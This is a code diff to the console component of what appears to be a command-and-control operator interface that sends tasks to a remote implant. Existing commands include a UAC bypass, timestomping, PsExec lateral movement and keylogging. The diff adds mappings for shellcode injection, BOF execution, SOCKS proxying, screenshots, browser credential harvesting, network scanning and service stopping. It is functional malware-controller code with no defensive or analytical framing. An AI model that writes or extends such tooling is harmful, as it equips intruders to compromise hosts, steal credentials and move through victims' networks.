@@ -102,12 +102,19 @@ export const Console = ({ implantId }: ConsoleProps) => {
             terminal.writeln('  uac <cmd>        - Fodhelper UAC bypass');
             terminal.writeln('  timestomp <tgt> <src> - Copy timestamps');
             terminal.writeln('  sandbox          - Check if in sandbox');
-            terminal.writeln('  recon            - System & Network info');
+            terminal.writeln('  recon            - System Info');
             terminal.writeln('  lateral <tgt> <svc> <bin> - PsExec via service');
             terminal.writeln('  keylog           - Poll keylogger');
             terminal.writeln('  kill             - Terminate implant');
             terminal.writeln('  setprofile <script> - Set PowerShell profile');
             terminal.writeln('  getprofile       - Get PowerShell profile');
+            terminal.writeln('  inject <pid> <method> <hex> - Inject shellcode');
+            terminal.writeln('  bof <hex>        - Execute COFF/BOF');
+            terminal.writeln('  socks <hex>      - SOCKS proxy data');
+            terminal.writeln('  screenshot       - Capture screenshot');
+            terminal.writeln('  browser          - Harvest browser creds');
+            terminal.writeln('  netscan <target> - Network scan');
+            terminal.writeln('  stopsvc <name>   - Stop service');
           } else if (trimmed.startsWith('setprofile ')) {
             const script = trimmed.substring(11);
             try {
@@ -140,11 +147,18 @@ export const Console = ({ implantId }: ConsoleProps) => {
                 case 'uac': type = 'uac_bypass'; payload = args; break;
                 case 'timestomp': type = 'timestomp'; payload = args; break;
                 case 'sandbox': type = 'sandbox_check'; payload = ''; break;
-                case 'recon': type = 'sys_info'; payload = ''; break; // or net_scan
+                case 'recon': type = 'sys_info'; payload = ''; break;
                 case 'lateral': type = 'psexec'; payload = args; break;
                 case 'keylog': type = 'keylogger'; payload = ''; break;
                 case 'kill': type = 'kill'; payload = ''; break;
                 case 'shell': type = 'shell'; payload = args; break;
+                case 'inject': type = 'inject'; payload = args; break;
+                case 'bof': type = 'bof'; payload = args; break;
+                case 'socks': type = 'socks'; payload = args; break;
+                case 'screenshot': type = 'screenshot'; payload = ''; break;
+                case 'browser': type = 'browser'; payload = ''; break;
+                case 'netscan': type = 'net_scan'; payload = args; break;
+                case 'stopsvc': type = 'service_stop'; payload = args; break;
                 default: 
                     // Assume shell if unknown? Or raw?
                     // Let's assume shell for now for raw commands
